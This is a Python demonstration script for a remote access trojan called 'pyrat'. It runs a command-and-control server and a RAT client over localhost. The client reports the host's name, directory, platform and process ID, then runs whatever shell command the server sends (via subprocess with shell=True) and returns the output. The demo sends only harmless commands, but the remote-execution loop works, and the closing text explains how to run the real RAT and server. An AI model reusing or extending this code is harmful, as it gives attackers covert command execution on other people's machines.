#!/usr/bin/env python3
"""
Interactive demonstration of pyrat protocol.
This script simulates both client and server to show the protocol in action.
"""

import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time

def send_json(sock: socket.socket, payload: dict) -> None:
    """Send a JSON message."""
    data = (json.dumps(payload) + "\n").encode("utf-8")
    sock.sendall(data)

def recv_json(sock: socket.socket) -> dict | None:
    """Receive a JSON message."""
    chunks = []
    while True:
        try:
            chunk = sock.recv(1)
            if not chunk:
                if not chunks:
                    return None
                break
            if chunk == b"\n":
                break
            chunks.append(chunk)
        except socket.timeout:
            if chunks:
                break
            return None
    raw = b"".join(chunks).decode("utf-8", errors="ignore").strip()
    if not raw:
        return None
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None

def simulate_client(port: int):
    """Simulate a RAT client."""
    print("[CLIENT] Starting client simulation...")
    time.sleep(1)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(("127.0.0.1", port))
        print("[CLIENT] [OK] Connected to CNC server")
        
        # Send hello
        hello = {
            "type": "hello",
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "platform": sys.platform,
            "pid": os.getpid(),
        }
        send_json(sock, hello)
        print(f"[CLIENT] -> Sent hello: {json.dumps(hello, indent=2)}")
        
        # Process commands
        sock.settimeout(2.0)
        for _ in range(10):  # Process up to 10 commands
            msg = recv_json(sock)
            if msg is None:
                break
            
            msg_type = msg.get("type")
            print(f"[CLIENT] <- Received: {json.dumps(msg, indent=2)}")
            
            if msg_type == "ping":
                send_json(sock, {"type": "pong"})
                print("[CLIENT] -> Sent pong")
            elif msg_type == "exec":
                cmd = msg.get("cmd", "")
                print(f"[CLIENT] Executing: {cmd}")
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True, timeout=5
                    )
                    send_json(sock, {
                        "type": "exec_result",
                        "cmd": cmd,
                        "result": {
                            "ok": True,
                            "stdout": result.stdout[:200],  # Limit output
                            "stderr": result.stderr[:200],
                            "returncode": result.returncode,
                        },
                        "cwd": os.getcwd(),
                    })
                    print(f"[CLIENT] -> Sent exec_result (returncode: {result.returncode})")
                except Exception as e:
                    send_json(sock, {
                        "type": "exec_result",
                        "cmd": cmd,
                        "result": {"ok": False, "error": str(e)},
                        "cwd": os.getcwd(),
                    })
            elif msg_type == "pwd":
                send_json(sock, {"type": "pwd_result", "cwd": os.getcwd()})
                print(f"[CLIENT] -> Sent pwd_result: {os.getcwd()}")
            elif msg_type == "exit":
                send_json(sock, {"type": "bye"})
                print("[CLIENT] -> Sent bye, exiting")
                break
            else:
                send_json(sock, {"type": "error", "error": f"Unknown command: {msg_type}"})
        
        sock.close()
        print("[CLIENT] Connection closed")
    except Exception as e:
        print(f"[CLIENT] Error: {e}")

def simulate_server(port: int):
    """Simulate a CNC server."""
    print("[SERVER] Starting server on port", port)
    
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", port))
    listener.listen(1)
    listener.settimeout(5.0)
    
    print("[SERVER] [OK] Listening for connections...")
    
    try:
        client_sock, addr = listener.accept()
        print(f"[SERVER] [OK] Client connected from {addr}")
        
        # Receive hello
        hello = recv_json(client_sock)
        if hello:
            print(f"[SERVER] <- Received hello: {json.dumps(hello, indent=2)}")
        
        # Send some commands
        commands = [
            {"type": "ping"},
            {"type": "pwd"},
            {"type": "exec", "cmd": "echo Hello from RAT!"},
        ]
        
        if platform.system() == "Windows":
            commands.append({"type": "exec", "cmd": "dir"})
        else:
            commands.append({"type": "exec", "cmd": "ls -la"})
        
        for cmd in commands:
            print(f"\n[SERVER] -> Sending: {json.dumps(cmd, indent=2)}")
            send_json(client_sock, cmd)
            time.sleep(0.5)
            
            # Receive response
            response = recv_json(client_sock)
            if response:
                print(f"[SERVER] <- Received: {json.dumps(response, indent=2)}")
            time.sleep(0.5)
        
        # Send exit
        print(f"\n[SERVER] -> Sending exit command")
        send_json(client_sock, {"type": "exit"})
        time.sleep(0.5)
        
        bye = recv_json(client_sock)
        if bye:
            print(f"[SERVER] <- Received: {json.dumps(bye, indent=2)}")
        
        client_sock.close()
        print("[SERVER] Connection closed")
    except socket.timeout:
        print("[SERVER] No client connected within timeout")
    finally:
        listener.close()

def main():
    print("=" * 70)
    print("pyrat Protocol Demonstration")
    print("=" * 70)
    print("\nThis script demonstrates the pyrat protocol by simulating")
    print("both a CNC server and a RAT client communicating.\n")
    
    port = 9002  # Use different port to avoid conflicts
    
    # Start server in a thread
    server_thread = threading.Thread(target=simulate_server, args=(port,), daemon=True)
    server_thread.start()
    time.sleep(1.0)  # Give server time to bind
    
    # Start client
    simulate_client(port)
    
    # Wait for server thread to finish
    server_thread.join(timeout=5)
    
    time.sleep(1)
    print("\n" + "=" * 70)
    print("Demonstration complete!")
    print("=" * 70)
    print("\nTo use the real pyrat:")
    print("  1. Start CNC server:  python cnc_server.py")
    print("  2. Start RAT client:   python rat.py")
    print("  3. In CNC server CLI:  list, use 1, exec <command>, etc.")

if __name__ == "__main__":
    main()

